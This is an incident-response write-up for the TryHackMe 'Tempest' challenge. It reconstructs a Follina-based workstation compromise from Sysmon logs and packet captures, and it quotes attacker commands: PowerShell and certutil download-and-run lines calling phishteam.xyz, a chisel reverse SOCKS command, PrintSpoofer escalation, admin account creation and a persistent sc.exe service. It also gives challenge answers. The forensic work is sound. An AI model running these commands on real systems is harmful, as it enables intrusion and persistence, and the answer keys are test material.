# Workstation Attack Analysis

## **Tempest CTF**

## TryHackMe (Challenge)

### Tools Used: PowerShell, EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer, Wireshark, Brim

### Scenario

This scenario focuses on the analysis of endpoint and network logs collected from a compromised workstation. The provided artefacts originate from the Tempest machine, which is suspected to have been involved in a full attack chain.

As an Incident Responder, your responsibility is to examine the captured logs and artefacts to identify, analyze, and reconstruct the incident. Through systematic log analysis, you will determine how the compromise occurred, what actions were taken by the attacker, and the overall impact on the affected system.

## Alert: Compromised Workstation Activity Detected

 ****

### Given Files

```json
**capture.pcapng
sysmon.evtx
windows.evtx**
```

## Preparation - Tools and Artifacts

The very first step before investigation we have to compare the files by their hash values for this we use powershell to get the hash value of the each files 

<img width="786" height="386" alt="Screenshot 2026-01-10 125316" src="https://github.com/user-attachments/assets/fee42f2c-4800-4dc6-9d13-bdceae3082e5" />


To parse the provided logs, we need first to convert the EVTX logs into CSV using EvtxEcmd and then feed it into Timeline Explorer.

<img width="836" height="421" alt="Screenshot 2026-01-10 130115" src="https://github.com/user-attachments/assets/80fccf48-5602-4059-896b-371a46709bb6" />

The CSV output will be saved to C:\Users\user\Desktop\Incident Files\sysmon.csv
****

<img width="589" height="186" alt="Screenshot 2026-01-10 130318" src="https://github.com/user-attachments/assets/f5be7033-76c5-487d-af19-852d335a79b4" />

load this sysmon.csv file into the TimelineExplorer tool

<img width="939" height="273" alt="Screenshot 2026-01-10 130726" src="https://github.com/user-attachments/assets/321e14cc-b304-423c-9096-cbc3461449bc" />


### Challenge Questions

1.What is the SHA256 hash of the capture.pcapng file?

We use Powershell to get the Hash value of the file, Command used is “  get-filehash -Algorithm SHA256 .\capture.pcapng ”

Answer: CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

2.What is the SHA256 hash of the sysmon.evtx file?
Same as previous step 

Answer: 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

3.What is the SHA256 hash of the windows.evtx file?
Same as previous step 

Answer: D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

## Initial Access - Malicious Document

# Investigation Guide

To aid with the investigation, you may refer to the cheatsheet crafted by the team applicable to this scenario:

- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document

### Challenge Questions

1.The user of this machine was compromised by a malicious document. What is the file name of the document?

To know what is the file name we can filter the event ID: 11 (File Creation) in TimelineExplorer tool

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

- The malicious document has a **.doc** extension.
- The user downloaded the malicious document via **chrome.exe**.
- The malicious document then executed a chain of commands to attain code execution.

So the now the malicious file can either be in .doc or .exe extension

<img width="953" height="418" alt="Screenshot 2026-01-10 131901" src="https://github.com/user-attachments/assets/35c6b83e-d710-4c46-abc3-dab71a372f4d" />

Answer: free_magicules.doc

2.What is the name of the compromised user and machine? *Format: username-machine name*

Previously we have found out that free_magicules.doc is the malicious file so filtered it by that name , and in the User Name field we see the username 

<img width="960" height="419" alt="Screenshot 2026-01-10 132709" src="https://github.com/user-attachments/assets/bdfb0124-04d4-4894-a09a-3fed3401f38b" />



In Computer field, The machine name is available 

<img width="959" height="418" alt="Screenshot 2026-01-10 132933" src="https://github.com/user-attachments/assets/3cc377ef-c3d6-45ca-a446-11d808023c2a" />



Answer: benimaru-TEMPEST

3.What is the PID of the Microsoft Word process that opened the malicious document?

We filter it out by the Microsoft Word Process and got WINWORD.EXE 

<img width="955" height="326" alt="Screenshot 2026-01-10 140007" src="https://github.com/user-attachments/assets/5d1cd267-780e-46f0-906d-55efed346c9b" />


ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700

Answer: 496

4.Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

To find out the malicious domain ip address we have to filter the field by DNS and the process id we found 496 

<img width="959" height="443" alt="Screenshot 2026-01-10 183520" src="https://github.com/user-attachments/assets/14a2e070-62d3-4afd-bc5c-106f5652917e" />


we found out that phishteam.xyz domain

<img width="960" height="438" alt="Screenshot 2026-01-10 183900" src="https://github.com/user-attachments/assets/75372a5a-1f46-43a7-9305-481a51582dd6" />


Answer: 167.71.199.191

5.What is the base64 encoded string in the malicious payload executed by the document?

To find out the base64 encoded document, filtered the search field with base64

<img width="958" height="433" alt="Screenshot 2026-01-10 184248" src="https://github.com/user-attachments/assets/31688832-b7db-4a9d-b5f4-e30aebe1d1d8" />


Decoded by Cyberchef

```json
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; 
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
 
```

Answer:

```json
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwc
FxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3
BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC
1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

6.What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

*Format: XXXX-XXXXX*

```json
Hint 

External research needed. Observe the parent-child relationship of Winword.exe 
and the process that executed the malicious base64 payload.
```

we search msdt.exe to find the CVE

<img width="720" height="324" alt="Screenshot 2026-01-10 185232" src="https://github.com/user-attachments/assets/b3e01ae6-4996-451c-8992-fd7f37f929e0" />


Answer: CVE-2022-30190

## Initial Access - Stage 2 execution

# Investigation Guide

With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:

- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

### Challenge Questions

1.The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

We know that update.zip is the malicious file, where decoded the base64 and got it.

filtering the search field by update.zip and 11 in Event ID field 

<img width="959" height="423" alt="Screenshot 2026-01-11 112018" src="https://github.com/user-attachments/assets/b4b4cbe5-8a83-4881-adde-1461f15e88a6" />


Answer :C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

2.The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

*Format: Remove the double quotes from the log*

Filtered the Username, Computer, Map description field based on target and finally searched the explorer.exe.

```json
Username:TEMPEST\benimaru
Computer:TEMPEST
Map Description:Process creation
```

I found out Powershell was suspicious among other executable info cause in the command they have used hidden flag for writing the code  

<img width="957" height="423" alt="Screenshot 2026-01-11 114501" src="https://github.com/user-attachments/assets/62f8ee5f-482e-4764-a5ed-6c0f7e3988e9" />


Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

3.Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

Searched first.exe and searched for SHA256 hash 

"C:\Users\Public\Downloads\first.exe”

Answer:CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

4.The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? 

*Format: domain:port*

To find the Domain we have to filter the Map description field with DNS 

<img width="958" height="389" alt="Screenshot 2026-01-11 131056" src="https://github.com/user-attachments/assets/5dc244d8-3243-4197-a9bf-fc495f80b052" />


We have found out the domain name, now we have to know what port it is using, to view that we need wireshark tool and filter it out with the domain name. http.host contains "resolvecyber.xyz”

<img width="957" height="227" alt="Screenshot 2026-01-11 132348" src="https://github.com/user-attachments/assets/735b89c6-72ff-49b1-9561-78a0039d10b8" />


It is using http which use port 80

Answer:resolvecyber.xyz:80

## Initial Access - Malicious Document Traffic

# Investigation Guide

Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:

- We can now use **Brim and Wireshark** to investigate the packet capture.
- Find network events related to the harvested domains and IP addresses.
- Sample Brim filter that you can use for this investigation: `_path=="http" "<malicious domain>"`

### Challenge Questions

1.What is the URL of the malicious payload embedded in the document?

form the harvested malicious domain “phishteam.xyz”, we filtered (http.host contains "phishteam.xyz") && (http.request.method == "GET") to see the url by clicking the 

packet 2411 → follow HTTP stream, /02dcf07/index.html 

<img width="650" height="221" alt="Screenshot 2026-01-11 154807" src="https://github.com/user-attachments/assets/ba64c31b-389e-4c5f-b564-31169b14b07f" />

Answer: http://phishteam.xyz/02dcf07/index.html

2.What is the encoding used by the attacker on the c2 connection?

<img width="624" height="352" alt="Screenshot 2026-01-11 155358" src="https://github.com/user-attachments/assets/c9bae193-513e-4c8f-9474-3eb0c5ce445a" />

Answer: Base64

3.The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

<img width="956" height="229" alt="Screenshot 2026-01-11 160708" src="https://github.com/user-attachments/assets/ecbb6697-d992-4ffa-a049-7b2ede52def6" />

Answer:q

4.The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

<img width="638" height="293" alt="Screenshot 2026-01-11 161446" src="https://github.com/user-attachments/assets/832b84d1-cf32-485f-9bbd-43ee61f063bd" />

Answer: /9ab62b5

5.Based on the user agent, what programming language was used by the attacker to compile the binary?
*Format: Answer in lowercase*

<img width="635" height="280" alt="Screenshot 2026-01-11 161759" src="https://github.com/user-attachments/assets/901ba331-e691-4e43-8167-d5fa1477d9bf" />

Answer:nim

## Discovery - Internal Reconnaissance

# Investigation Guide

To continue with the investigation, we may focus on the following information:

- Find network and process events connecting to the malicious domain.
- Find network events that contain an encoded command.
- We can use Brim to filter all packets containing the encoded string.
- Look for endpoint enumeration commands since the attacker is already inside the machine.

1.The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

Every command was encoded with base64, i want to copy paste each code in cyberchef by doing it manually. packet 5893 

<img width="770" height="409" alt="Screenshot 2026-01-11 172123" src="https://github.com/user-attachments/assets/750cad44-ac4b-4a09-a5a5-f6055bf5f3c4" />

Answer:infernotempest

2.The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

<img width="413" height="461" alt="Screenshot 2026-01-11 173358" src="https://github.com/user-attachments/assets/4af626c9-a441-443f-b3b4-2d2dc7dd5798" />

Answer: 5985

3.The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

*Format: Remove the double quotes from the log.*

Searched the keyword socks 

<img width="959" height="174" alt="Screenshot 2026-01-11 174455" src="https://github.com/user-attachments/assets/c382c9fb-87eb-4eac-a47d-e50400d47cb8" />

Answer:C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

4.What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

Answer: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

5.What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
There are other names for the tool also but chisel was the one when i was released 

<img width="472" height="268" alt="Screenshot 2026-01-11 175309" src="https://github.com/user-attachments/assets/18526601-1a76-442a-b3f8-bda78be56560" />

Answer: chisel

5.The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

*Format: Answer in lowercase*

sorted the line from small to high for proper order. after the reverse sock connection line there is next tool executed by attacker “wsmprovhost.exe”  

<img width="958" height="356" alt="Screenshot 2026-01-11 181008" src="https://github.com/user-attachments/assets/db9eacd9-a7d1-4962-97a6-d54c3fa8d0f8" />

```json
Hint
External research needed. Use the process name to determine the service name.
```


<img width="556" height="304" alt="Screenshot 2026-01-11 181445" src="https://github.com/user-attachments/assets/b5e7a10a-7bbe-48db-ac3b-d76130754c77" />

Answer: WinRM

## Privilege Escalation - Exploiting Privileges

# Investigation Guide

With this, we can focus on the following network and endpoint events:

- Look for events executed after the successful execution of the reverse socks proxy tool.
- Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

1.After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

*Format: binary name,SHA256 hash*

The ran whoami command to know the privilege and then ran "C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe

Answer: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D 

2.Based on the SHA256 hash of the binary, what is the name of the tool used?

*Format: Answer in lowercase*

To find the tool name paste the SHA256 hash value 

<img width="614" height="193" alt="Screenshot 2026-01-11 182707" src="https://github.com/user-attachments/assets/9b0183cc-94a8-4d02-bb5c-21c0b6ec5313" />

Answer: PrintSpoofer

3.The tool exploits a specific privilege owned by the user. What is the name of the privilege?

<img width="568" height="354" alt="Screenshot 2026-01-11 183151" src="https://github.com/user-attachments/assets/914be6a5-687a-49ff-8994-59663f063e2f" />

Answer:SeImpersonatePrivilege

4.Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

<img width="958" height="355" alt="Screenshot 2026-01-11 183423" src="https://github.com/user-attachments/assets/26949b08-4209-4b12-839e-831a8aa1db4f" />

Answer:final.exe

5.The binary connects to a different port from the first c2 connection. What is the port used?
 Once the attacker gained the c2 connection 

<img width="960" height="169" alt="Screenshot 2026-01-11 184136" src="https://github.com/user-attachments/assets/24b87cb6-192b-4769-b948-bc76e61f8774" />

Answer: 8080

## Actions on Objective - Fully-owned Machine

# Investigation Guide

Now, we can rely on our cheatsheet to investigate events after a successful privilege escalation:

- The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with **NT Authority\System.**
- All child events of the new malicious binary used for C2 are worth checking.

1.Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

*Format: Answer in alphabetical order - comma delimited*

Used Brim to see the base64 encoded commands, the filter used :

```json
_path=="http" "resolvecyber.xyz"  id.resp_p==8080 | cut ts, host, id.resp_p, uri | sort ts

Timing of the packet:2022-06-20T17:27:32.273117Z
```
<img width="480" height="412" alt="Screenshot 2026-01-11 190831" src="https://github.com/user-attachments/assets/bee98bc1-801e-44c1-9bc3-f3f88c1788e7" />

Answer: shion,shuna

2.Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

Packet Time: 2022-06-20T17:27:41.352183Z

<img width="484" height="412" alt="Screenshot 2026-01-11 191617" src="https://github.com/user-attachments/assets/692707ca-f8d4-4950-9e95-bfd9f62927c4" />

Answer: /add

3.Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
Search in google What event id for account creation

Answer: 4720

4.The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

<img width="482" height="320" alt="Screenshot 2026-01-11 191932" src="https://github.com/user-attachments/assets/9e1d2e93-628b-4e82-b0e5-6356953f49b4" />

Answer: net localgroup administrators /add shion

5.Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

Search in google : event ID that indicates the addition to a sensitive local group?

Answer: 4732

6.After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

*Format: Remove the double quotes from the log*

We know that attacker is in Tempest Computer system we filter the executable field “Tempest”

<img width="957" height="266" alt="Screenshot 2026-01-11 192915" src="https://github.com/user-attachments/assets/97f4ee1e-a31e-450a-86c5-1b2d655021e5" />

Answer: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

### Done By Ruthran-sec
